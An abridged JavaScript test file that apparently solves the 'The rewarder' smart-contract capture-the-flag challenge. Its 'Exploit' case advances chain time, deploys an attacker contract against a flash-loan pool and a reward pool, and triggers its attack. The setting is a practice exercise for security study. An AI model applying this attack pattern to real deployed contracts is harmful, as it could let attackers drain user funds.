...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    const RewarderPoolAttackerFactory = await ethers.getContractFactory(
      "RewarderPoolAttacker",
      attacker
    );
    const RewarderPoolAttacker = await RewarderPoolAttackerFactory.deploy(
      this.flashLoanPool.address,
      this.rewarderPool.address,
      this.liquidityToken.address,
      this.rewardToken.address
    );
    await RewarderPoolAttacker.connect(attacker).Attack();
  });
